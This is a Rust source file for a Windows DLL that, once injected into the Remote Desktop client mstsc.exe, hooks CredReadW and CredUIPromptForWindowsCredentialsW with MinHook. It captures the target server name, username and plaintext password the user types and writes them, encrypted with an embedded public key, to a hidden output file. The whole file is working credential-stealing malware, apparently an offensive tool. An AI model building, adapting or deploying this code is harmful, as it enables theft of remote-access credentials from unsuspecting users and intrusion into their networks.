use crypto_common::encrypt_and_log_data_to_file;
use minhook_sys::{MH_CreateHook, MH_EnableHook, MH_Initialize, MH_Uninitialize, MH_OK};
use std::{env::current_exe, ffi::c_void, mem::transmute, ptr::null_mut};
use windows::{
    core::{PCSTR, PCWSTR, PWSTR},
    Win32::{
        Foundation::{BOOL, HINSTANCE},
        Security::Credentials::{
            CredUnPackAuthenticationBufferW, CREDENTIALW, CREDUIWIN_FLAGS, CREDUI_INFOW,
            CREDUI_MAX_USERNAME_LENGTH, CRED_PACK_PROTECTED_CREDENTIALS, CRED_TYPE,
        },
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH},
        },
    },
};

use std::sync::{Mutex, Once};

#[cfg(debug_assertions)]
use {crypto_common::log_data, std::process};

static START: Once = Once::new();

const PUBLIC_KEY: &[u8; 32] = include_bytes!("../../public.key");
const OUTPUT_PATH: &str = env!("OUTPUT_PATH");

static LAST_TERMSRV: Mutex<String> = Mutex::new(String::new());

static mut ORIGINAL_CREDUI_PROMPT_FOR_WINDOWS_CREDENTIALS_W: *mut c_void = null_mut();
static mut ORIGINAL_CRED_READ_W: *mut c_void = null_mut();

extern "C" fn cred_read_w_hook(
    targetname: PCWSTR,
    type_cred: CRED_TYPE,
    flags: u32,
    credential: *mut *mut CREDENTIALW,
) -> BOOL {
    let original_func: extern "C" fn(
        targetname: PCWSTR,
        type_cred: CRED_TYPE,
        flags: u32,
        credential: *mut *mut CREDENTIALW,
    ) -> BOOL = unsafe { transmute(ORIGINAL_CRED_READ_W as *const usize) };

    if let Ok(value_name) = unsafe { targetname.to_string() } {
        if value_name.starts_with("TERMSRV/") {
            let mut mutex_termsrv = LAST_TERMSRV.lock().unwrap();
            *mutex_termsrv = value_name.clone();
        }
    }

    let ret_value = original_func(targetname, type_cred, flags, credential);

    ret_value
}

extern "C" fn credui_prompt_for_windows_credentials_hook(
    puiinfo: *const CREDUI_INFOW,
    dwautherror: u32,
    pulauthpackage: *mut u32,
    pvinauthbuffer: *const c_void,
    ulinauthbuffersize: u32,
    ppvoutauthbuffer: *mut *mut c_void,
    puloutauthbuffersize: *mut u32,
    pfsave: *mut BOOL,
    dwflags: CREDUIWIN_FLAGS,
) -> u32 {
    type FnCredUIPromptForWindowsCredentialsW = extern "C" fn(
        *const CREDUI_INFOW,
        u32,
        *mut u32,
        *const c_void,
        u32,
        *mut *mut c_void,
        *mut u32,
        *mut BOOL,
        CREDUIWIN_FLAGS,
    ) -> u32;

    let original_func: FnCredUIPromptForWindowsCredentialsW =
        unsafe { transmute(ORIGINAL_CREDUI_PROMPT_FOR_WINDOWS_CREDENTIALS_W) };
    let ret_val = original_func(
        puiinfo,
        dwautherror,
        pulauthpackage,
        pvinauthbuffer,
        ulinauthbuffersize,
        ppvoutauthbuffer,
        puloutauthbuffersize,
        pfsave,
        dwflags,
    );

    let mut username_size = CREDUI_MAX_USERNAME_LENGTH as u32;
    let mut username = vec![0 as u16; username_size as usize];

    let mut password_size = 256 as u32;
    let mut password = vec![0 as u16; password_size as usize];

    unsafe {
        let result = CredUnPackAuthenticationBufferW(
            CRED_PACK_PROTECTED_CREDENTIALS,
            *ppvoutauthbuffer,
            *puloutauthbuffersize,
            PWSTR::from_raw(username.as_mut_ptr()),
            &mut username_size as *mut u32,
            PWSTR::null(),
            None,
            PWSTR::from_raw(password.as_mut_ptr()),
            &mut password_size as *mut u32,
        );
        if result.is_err() {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID : {} - Failed CredUnpPackAuthenticationBufferW",
                    process::id()
                ));
            }
            return ret_val;
        }
    };

    {
        let mutex_termsrv = LAST_TERMSRV.lock().unwrap();
        let line: Vec<u16> = format!("[mstsc.exe] Target Server : {}", *mutex_termsrv)
            .encode_utf16()
            .collect();

        #[cfg(not(debug_assertions))]
        let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
        #[cfg(debug_assertions)]
        let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

        #[cfg(debug_assertions)]
        {
            if result.is_err() {
                log_data(format!(
                    "PID {} - Failed writing output log file",
                    process::id()
                ));
            }
        };
    }

    let line: Vec<u16> = format!(
        "[mstsc.exe] Username : {}",
        String::from_utf16_lossy(&username)
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "PID {} - Failed writing output log file",
                process::id()
            ));
        }
    }

    let line: Vec<u16> = format!(
        "[mstsc.exe] Password : {}",
        String::from_utf16_lossy(&password)
    )
    .encode_utf16()
    .collect();

    #[cfg(not(debug_assertions))]
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &line, PUBLIC_KEY);

    #[cfg(debug_assertions)]
    {
        if result.is_err() {
            log_data(format!(
                "PID {} - Failed writing output log file",
                process::id()
            ));
        }
    }

    ret_val
}

fn hook_credui() {
    if unsafe { MH_Initialize() } != MH_OK {
        #[cfg(debug_assertions)]
        {
            log_data(format!("PID : {} - Failed MH_Initialize\n", process::id()));
        }
        return;
    }

    let sechost = unsafe { GetModuleHandleA(PCSTR("sechost.dll\0".as_ptr())) };
    if sechost.is_ok() {
        let sechost_handle = sechost.unwrap();
        let func = unsafe { GetProcAddress(sechost_handle, PCSTR("CredReadW\0".as_ptr())) };

        if func.is_some() {
            let cred_read_w = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    cred_read_w as *mut c_void,
                    cred_read_w_hook as *mut c_void,
                    &mut ORIGINAL_CRED_READ_W,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for CredReadW\n",
                        process::id()
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(cred_read_w as *mut c_void) } != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for CredReadW\n",
                        process::id()
                    ));
                }
                return;
            }
        }
    } else {
        #[cfg(debug_assertions)]
        {
            log_data(format!(
                "PID : {} - Failed GetModuleHandleA for sechost.dll\n",
                process::id()
            ));
        }
    }

    let credui_handle = unsafe { GetModuleHandleA(PCSTR("credui.dll\0".as_ptr())) };
    if credui_handle.is_ok() {
        let credui_handle = credui_handle.unwrap();

        let func = unsafe {
            GetProcAddress(
                credui_handle,
                PCSTR("CredUIPromptForWindowsCredentialsW\0".as_ptr()),
            )
        };

        if func.is_some() {
            let func_addr = func.unwrap();
            if unsafe {
                MH_CreateHook(
                    func_addr as *mut c_void,
                    credui_prompt_for_windows_credentials_hook as *mut c_void,
                    &mut ORIGINAL_CREDUI_PROMPT_FOR_WINDOWS_CREDENTIALS_W,
                )
            } != MH_OK
            {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_CreateHook for CredUIPromptForWindowsCredentialsW\n",
                        process::id()
                    ));
                }
                return;
            }

            if unsafe { MH_EnableHook(func_addr as *mut c_void) } != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID : {} - Failed MH_EnableHook for CredUIPromptForWindowsCredentialsW\n",
                        process::id()
                    ));
                }
                return;
            }
        } else {
            #[cfg(debug_assertions)]
            {
                log_data(format!(
                    "PID {} - Failed GetProcAddress for credui.dll!CredUIPromptForWindowsCredentialsW\n",
                    process::id()
                ));
            }
        }
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(dll_module: HINSTANCE, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => START.call_once(|| {
            if let Ok(exe_name) = current_exe() {
                if exe_name.ends_with("mstsc.exe") {
                    hook_credui();
                    #[cfg(debug_assertions)]
                    {
                        log_data(format!("PID {} - Init successful", process::id()));
                    }
                }
            }
        }),
        DLL_PROCESS_DETACH => unsafe {
            if MH_Uninitialize() != MH_OK {
                #[cfg(debug_assertions)]
                {
                    log_data(format!(
                        "PID {} - Failed to uninitialize MinHook",
                        process::id()
                    ));
                }

                return false;
            }
        },
        _ => {}
    }

    true
}
